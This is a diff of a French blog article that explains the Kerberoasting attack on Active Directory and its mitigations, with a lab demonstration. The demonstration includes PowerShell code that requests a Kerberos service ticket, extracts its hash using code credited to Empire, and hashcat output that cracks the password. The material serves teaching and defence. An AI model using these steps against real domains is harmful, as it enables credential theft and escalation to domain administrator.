@@ -6,98 +6,65 @@ listed: true
 
 ## Contexte et explication
 
-Lors d'un lancement d'un audit Ping Castle, vous êtes peut-être tombé sur la vulnérabilité "P-Kerberoasting" dans votre domaine (attaque Kerberoasting). Cette faille de sécurité est classée au niveau 1 de criticité (le plus élevé) par l'ANSSI et représente un **gros risque** pour votre Active Directory.
+Après un audit Ping Castle, vous êtes peut-être tombé sur la vulnérabilité "P-Kerberoasting" dans votre domaine (attaque Kerberoasting). Cette faille de sécurité est classée au niveau 1 de criticité (le plus élevé) par l'ANSSI et représente un **gros risque** pour votre Active Directory.
 
-Le principe est simple : un compte avec un haut niveau de privilège dans votre annuaire possède une valeur inscrite dans son attribut `servicePrincipalName`.
+La source de cette vulnérabilité est simple : un compte avec un haut niveau de privilège dans votre annuaire (*Admin du domaine* par exemple) possède une valeur inscrite dans son attribut `servicePrincipalName` (SPN). Cette valeur n'a pas besoin d'être valide ou de pointer vers un vrai serveur/service : sa simple présence suffit.
 
 ### Fonctionnement du ServicePrincipalName
 
 L'attribut `servicePrincipalName` permet plusieurs choses dans Active Directory :
 
 - **Identification d'un service :** Il permet à Kerberos de savoir quel service un utilisateur veut contacter. Par exemple, `HTTPS/server.contoso.com:443` identifie un serveur web, ou `MSSQLSvc/server.contoso.com` pour une base de données.
-- **Authentification sécurisée :** Kerberos utilise le SPN pour générer un ticket d'accès (TGS) chiffré avec le mot de passe de l'utilisateur qui porte le `servicePrincipalName`.
+- **Authentification sécurisée :** Kerberos utilise le SPN pour générer un ticket d'accès au service demandé (TGS), chiffré avec le mot de passe de l'utilisateur qui porte le `servicePrincipalName`.
 
-Le principal problème lié au SPN est que **n'importe quel utilisateur du domaine** peut demander un ticket d'accès pour le compte qui porte le SPN. Un attaquant ayant donc obtenu un compte dans le domaine, 
+### Déroulement d'une attaque
 
+L'attaque Kerberoasting est la contraction de "Kerberos" (le protocole d'authentification qui fourni le TGS) et de "roast(ing)" qui fait référence au fait de faire chauffer (ou rôtir plus exactement) avec du brute-force le ticket que l'on a réussi à obtenir.
 
+Le principal problème réside dans le fait que **n'importe quel utilisateur du domaine** peut demander un ticket d'accès pour le compte qui porte le SPN (aucun privilège n'est nécessaire). Si on arrive à récupérer au moins un ticket TGS, alors on peut essayer de le *"brute-forcer"* hors-ligne pour obtenir le mot de passe du compte cible.
 
-### Danger du K
+Puisque le ticket est chiffré de manière irréversible avec le mot de passe, il n'est pas possible de le déchiffrer directement. L'attaquant va plutôt essayer de recréer le même hash de ticket à partir d'un mot de passe qu'il connait (soit en utilisant un dictionnaire, soit en générant aléatoirement un mot de passe). Si le ticket généré par l'attaquant est identique à celui qui a été capturé : le mot de passe a été trouvé.
 
+L'avantage de cette technique est qu'elle est relativement discrète (à moins que vous ailliez des solutions de surveillance comme [Semperis Directory Services Protector](https://www.semperis.com/fr/active-directory-security/) par exemple) et qu'elle permet une escalade directe du Tier 2 vers le Tier 0 (si le mot de passe parvient à être cassé).
 
+### Comment résoudre cette vulnérabilité ?
 
-Description:
-The purpose is to ensure that the password of admin accounts cannot be retrieved using the Kerberoast attack.
+La seule méthode pour résoudre complètement cette vulnérabilité est de supprimer **toutes** les valeurs présentes dans le SPN.
 
-Technical Explanation:
-To access a service using Kerberos, a user requests a ticket (named TGS) to the DC specific to the service.
-This ticket is encrypted using a derivative of the service password, but can be brute-forced to retrieve the original password.
-Any account having the attribute SPN populated is considered as a service account.
-Given that any user can request a ticket for a service account, these accounts can have their password retrieved.
-In addition, services are known to have their password not changed at a regular basis and to use well-known words.
+Bien évidemment, il n'est pas toujours possible de pouvoir faire ce genre d'action. Dans ce cas, voici les actions que vous pouvez mener (sans avoir à supprimer les SPN) :
 
-Please note that this program ignores service accounts that had their password changed in the last 40 days ago to support using password rotation as a mitigation.
+1. Réduire au maximum les permissions du compte qui porte le SPN pour éviter que sa compromission ne soit un danger immédiat pour votre Active Directory
+2. Utiliser des mots de passe très long (plus de 25 caractères) et complexes pour allonger le temps nécessaire pour pouvoir le brute-forcer
+3. N'autoriser que le chiffrement AES 256 pour les tickets Kerberos du compte, toujours pour ralentir l'attaque brute-force (attribut `msDS-SupportedEncryptionTypes`)
+4. Renouveler le mot de passe régulièrement pour rendre caduque un ticket TGS qui aurait été volé
 
-Advised Solution:
-If the account is a service account, the service should be removed from the privileged group or have a process to change its password at a regular basis.
-If the user is a person, the SPN attribute of the account should be removed.
+## Exemple d'attaque
 
+Dans la suite de cet article nous utiliserons des commandes PowerShell du module Active Directory et le logiciel [hashcat](https://hashcat.net/hashcat/). Les deux sont facilement disponibles sous Windows. L'idée de cet article n'est pas de donner un guide détaillé sur cette attaque en environnement réel, mais plutôt de pouvoir la reproduire dans un lab pour démontrer son fonctionnement. Les commandes indiquées ne sont pas les plus performantes ou les plus discrètes.
 
+### Création du compte
 
-
-
-
-## Fonctionnement
-
-### Contexte
-
-Actuellement, le compte `admin-service` est considéré comme la faille la plus critique du domaine Active Directory SDIS29.LOCAL pour les raisons suivantes :
-
-- Il est "administrateur du domaine", le niveau de privilège le plus élevé possible
-- Il contient au moins un SPN (ServicePrincipalName) qui permet son utilisation depuis plusieurs serveurs/services
-
-Cette combinaison fait de ce compte une cible parfaite pour l'attaque **Kerberoasting**.
-
-### Fonctionnement de l'attaque
-
-L'attaque Kerberoasting consiste à demander un ticket Kerberos (protocole d'authentification Active Directory) en utilisant un SPN présent sur le compte cible. Cette opération ne requiert aucun privilège, aucune connaissance de Kerberos et peut donc être réalisée par **n'importe quel utilisateur du domaine**.
-
-Ici le seul prérequis pour l'attaquant est donc de récupérer un compte parmi les +3000 présents dans le domaine et d'avoir accès au réseau.
-
-Une fois le ticket récupéré, il ne reste plus qu'à le craquer hors ligne (attaque par dictionnaire ou bruteforce). Suivant la longueur du mot de passe et l'algorithme de chiffrement, cela peut être plus ou moins long.
-
-Une fois le mot de passe craqué, l'attaquant récupère le mot de passe du compte de service (qui dans notre cas est administrateur du domaine) et il sera en mesure de contrôler l'intégralité de Active Directory.
-
-Cette vulnérabilité permet donc une escalade d'un utilisateur sans aucun privilège vers le niveau le plus élevé de privilège dans Active Directory **en une seule étape**.
-
-### Solutions
-
-Dans notre cas, il n'y a que deux solutions possibles :
-
-- Réduire le niveau de privilèges du compte `admin-service` pour éviter qu'il puisse compromettre l'intégralité du domaine
-- Supprimer **tous** les SPN du compte `admin-service`
-
-Les autres solutions (chiffrement Kerberos renforcé avec AES256, mots de passe plus long et changement fréquent du mot de passe) ne doivent pas être considérées comme des solutions viables sur le long terme.
-
-## Attaque
-
-Création d'un utilisateur avec SPN :
+La première étape est de créer le compte Active Directory avec un SPN est un mot de passe suffisamment faible pour pouvoir être cassé avec une attaque par dictionnaire. Ici nous allons créer le compte de John Smith, avec le mot de passe `ZombieKiller2008` qui devrait satisfaire la politique de mot de passe par défaut (16 caractères de long et de la complexité).
 
 ```powershell
 $splat = @{
-    Name              = 'SMITH John'
+    Name              = 'John Smith'
     Enabled           = $true
     SamAccountName    = 'smithjo'
-    UserPrincipalName =  'smithjo@sdis29.local'
+    UserPrincipalName =  'smithjo@contoso.com'
     AccountPassword   = ('ZombieKiller2008' | ConvertTo-SecureString -AsPlainText -Force)
-    Path              = 'OU=Autres Situations Administratives,OU=Utilisateurs,DC=sdis29,DC=local'
     OtherAttributes   = @{
-        ServicePrincipalName = 'MSSQLSvc/server.sdis29.local'
+        ServicePrincipalName = 'MSSQLSvc/server.contoso.com'
     }
 }
 New-ADUser @splat
 ```
 
-Source du code : [Empire/data/module_source/credentials/Invoke-Kerberoast.ps1 at master · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660)
+On va ensuite collecter des informations liées à l'environnement Active Directory, pour permettre à hashcat de créer un ticket et comparer le résultat avec l'original. Nous avons besoin des informations suivantes :
+
+- Le nom DNS du domaine (contoso.com par exemple)
+- Le SamAccountName de l'utilisateur qui porte le SPN (smithjo)
+- La valeur du SPN que l'on va utiliser
 
 Récupération d'un SPN (n'importe lequel) :
 
@@ -108,6 +75,8 @@ $sam = $user.SamAccountName
 $spn = $user.servicePrincipalName[-1]
 ```
 
+
+
 Création d'un ticket Kerberos :
 
 ```powershell
@@ -115,6 +84,8 @@ $ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::New($spn
 ```
 
 Récupération du hash du ticket :
+
+Source du code : [Empire/data/module_source/credentials/Invoke-Kerberoast.ps1 at master · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660)
 
 ```powershell
 $ticketByteStream = $ticket.GetRequest()
@@ -179,12 +150,12 @@ Dictionary cache hit:
 * Bytes.....: 404901152
 * Keyspace..: 35638385
 
-$krb5tgs$23$*smithjo$sdis29.local$MSSQLSvc/server.sdis29.local*$abf9befd[...]f3ea6085:ZombieKiller2008
+$krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.contoso.com*$abf9befd[...]f3ea6085:ZombieKiller2008
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
-Hash.Target......: $krb5tgs$23$*smithjo$sdis29.local$MSSQLSvc/server.s...ea6085
+Hash.Target......: $krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.s...ea6085
 Time.Started.....: Wed Jun 25 11:04:25 2025 (47 secs)
 Time.Estimated...: Wed Jun 25 11:05:12 2025 (0 secs)
 Kernel.Feature...: Pure Kernel
